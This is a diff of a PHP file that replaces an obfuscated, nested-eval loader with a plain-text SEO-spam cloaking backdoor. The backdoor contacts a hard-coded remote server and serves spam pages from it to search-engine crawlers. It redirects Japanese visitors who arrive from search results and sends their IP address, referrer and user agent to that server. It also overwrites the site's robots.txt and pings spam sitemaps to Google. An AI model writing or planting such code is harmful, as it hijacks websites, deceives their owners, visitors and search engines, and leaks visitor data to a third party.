@@ -1,1 +1,173 @@
-<?php /* Obfuscated at https://php-obfuscator.online */ function _60uT($_lyRp6FM4){ $_lyRp6FM4 = substr($_lyRp6FM4, 1096); $_lyRp6FM4 = substr($_lyRp6FM4, 0, -421); return $_lyRp6FM4;}$_9ykVS = '_60uT';$_Eau7ym = 'base64_decode';function _y61wgQqXWRKJMZ49DTq1N($_stCrQ6TV){global $_9ykVS; global $_Eau7ym; return strrev(gzinflate($_Eau7ym(_60uT($_stCrQ6TV))));} eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval('?>'._y61wgQqXWRKJMZ49DTq1N('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uKBV70XgqFFmC2uuKYbJ2S/Y79Uae0Xa8i6udBoviixSsu0ssTx9suurARTDfikIN83uYb+fosO85QfPyqqgHUJZI52u1njO87uxXoWS4LvGS1ge5ZFulWROGcjYnPp8OJ+Mmmt32Zfx2lZW5lDqNcSnbkdfDbeT4sDkXGm+8EKS71TbxSxn2u1n2TXodIq346p+GPnZRhkXYL494fP1Ur8pVXgdWxq3mne5rdWvH/hSebwywjJMsS8YZ4GMWamCfDhPFwvUYYKjftr3keeyrwUSHJZpG24RiNX0Hw==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')))))))))))))))))))))); ?>
+<?php 
+$inter_domain = 'http://192.187.108.42/z1007_7/';
+function curl_get_contents($url)
+{
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+    $file_contents = curl_exec($ch);
+    curl_close($ch);
+    return $file_contents;
+}
+function getServerCont($url, $data = array())
+{
+    $url = str_replace(' ', '+', $url);
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, "$url");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    $output = curl_exec($ch);
+    $errorCode = curl_errno($ch);
+    curl_close($ch);
+    if (0 !== $errorCode) {
+        return false;
+    }
+    return $output;
+}
+function is_crawler($agent)
+{
+    $agent_check = false;
+    $bots = 'googlebot|google|yahoo|bing|aol';
+    if ($agent != '') {
+        if (preg_match("/($bots)/si", $agent)) {
+            $agent_check = true;
+        }
+    }
+    return $agent_check;
+}
+function check_refer($refer)
+{
+    $check_refer = false;
+    $referbots = 'google.co.jp|yahoo.co.jp|google.com';
+    if ($refer != '' && preg_match("/($referbots)/si", $refer)) {
+        $check_refer = true;
+    }
+    return $check_refer;
+}
+$http = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://');
+$req_uri = $_SERVER['REQUEST_URI'];
+$domain = $_SERVER["HTTP_HOST"];
+$self = $_SERVER['PHP_SELF'];
+$ser_name = $_SERVER['SERVER_NAME'];
+$req_url = $http . $domain . $req_uri;
+$indata1 = $inter_domain . "/indata.php";
+$map1 = $inter_domain . "/map.php";
+$jump1 = $inter_domain . "/jump.php";
+$url_words = $inter_domain . "/words.php";
+$url_robots = $inter_domain . "/robots.php";
+if (strpos($req_uri, ".php")) {
+    $href1 = $http . $domain . $self;
+} else {
+    $href1 = $http . $domain;
+}
+$data1[] = array();
+$data1['domain'] = $domain;
+$data1['req_uri'] = $req_uri;
+$data1['href'] = $href1;
+$data1['req_url'] = $req_url;
+if (substr($req_uri, -6) == 'robots') {
+    define('BASE_PATH', str_ireplace($_SERVER['PHP_SELF'], '', __FILE__));
+    $robots_cont = @file_get_contents(BASE_PATH . '/robots.txt');
+    $data1['robots_cont'] = $robots_cont;
+    $robots_cont = @getServerCont($url_robots, $data1);
+    file_put_contents(BASE_PATH . '/robots.txt', $robots_cont);
+    $robots_cont = @file_get_contents(BASE_PATH . '/robots.txt');
+    if (strpos(strtolower($robots_cont), "sitemap")) {
+        echo 'robots.txt file create success!';
+    } else {
+        echo 'robots.txt file create fail!';
+    }
+    exit;
+}
+if (substr($req_uri, -4) == '.xml') {
+    if (strpos($req_uri, "pingsitemap.xml")) {
+        $str_cont = getServerCont($map1, $data1);
+        $str_cont_arr = explode(",", $str_cont);
+        $str_cont_arr[] = 'sitemap';
+        for ($k = 0; $k < count($str_cont_arr); $k++) {
+            if (strpos($href1, ".php") > 0) {
+                $tt1 = '?';
+            } else {
+                $tt1 = '/';
+            }
+            $http2 = $href1 . $tt1 . $str_cont_arr[$k] . '.xml';
+            $data_new = 'https://www.google.com/ping?sitemap=' . $http2;
+            $data_new1 = 'http://www.google.com/ping?sitemap=' . $http2;
+            if (stristr(@file_get_contents($data_new), 'successfully')) {
+                echo $data_new . '===>Submitting Google Sitemap: OK' . PHP_EOL;
+            } else if (stristr(@curl_get_contents($data_new), 'successfully')) {
+                echo $data_new . '===>Submitting Google Sitemap: OK' . PHP_EOL;
+            } else if (stristr(@file_get_contents($data_new1), 'successfully')) {
+                echo $data_new1 . '===>Submitting Google Sitemap: OK' . PHP_EOL;
+            } else if (stristr(@curl_get_contents($data_new1), 'successfully')) {
+                echo $data_new1 . '===>Submitting Google Sitemap: OK' . PHP_EOL;
+            } else {
+                echo $data_new1 . '===>Submitting Google Sitemap: fail' . PHP_EOL;
+            }
+        }
+        exit;
+    }
+    if (strpos($req_uri, "allsitemap.xml") || strpos($req_uri, "sitemap-index.xml") || strpos($req_uri, "sitemap-index-1.xml")) {
+        $str_cont = getServerCont($map1, $data1);
+        header("Content-type:text/xml");
+        echo $str_cont;
+        exit;
+    }
+    if (strpos($req_uri, ".php")) {
+        $word4 = explode("?", $req_uri);
+        $word4 = $word4[count($word4) - 1];
+        $word4 = str_replace(".xml", "", $word4);
+    } else {
+        $word4 = str_replace("/", "", $req_uri);
+        $word4 = str_replace(".xml", "", $word4);
+    }
+    $data1['word'] = $word4;
+    $data1['action'] = 'check_sitemap';
+    $check_url4 = getServerCont($url_words, $data1);
+    if ($check_url4 == '1') {
+        $str_cont = getServerCont($map1, $data1);
+        header("Content-type:text/xml");
+        echo $str_cont;
+        exit;
+    }
+    $data1['action'] = "check_words";
+    $check1 = getServerCont($url_words, $data1);
+    if (strpos($req_uri, "map") > 0 || $check1 == '1') {
+        $data1['action'] = "rand_xml";
+        $check_url4 = getServerCont($url_words, $data1);
+        header("Content-type:text/xml");
+        echo $check_url4;
+        exit;
+    }
+}
+if (strpos($req_uri, ".php")) {
+    $main_shell = $http . $ser_name . $self;
+    $data1['main_shell'] = $main_shell;
+} else {
+    $main_shell = $http . $ser_name;
+    $data1['main_shell'] = $main_shell;
+}
+$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+$chk_refer = check_refer($referer);
+$user_agent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
+$res_crawl = is_crawler($user_agent);
+if (!$res_crawl && $chk_refer && preg_match('/ja/i', @$_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
+    $data1['ip'] = $_SERVER["REMOTE_ADDR"];
+    $data1['referer'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+    $data1['user_agent'] = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
+    echo getServerCont($jump1, $data1);
+    exit;
+}
+if ($res_crawl) {
+    $data1['http_user_agent'] = $user_agent;
+    $get_content = getServerCont($indata1, $data1);
+    echo $get_content;
+    exit;
+}
+?>
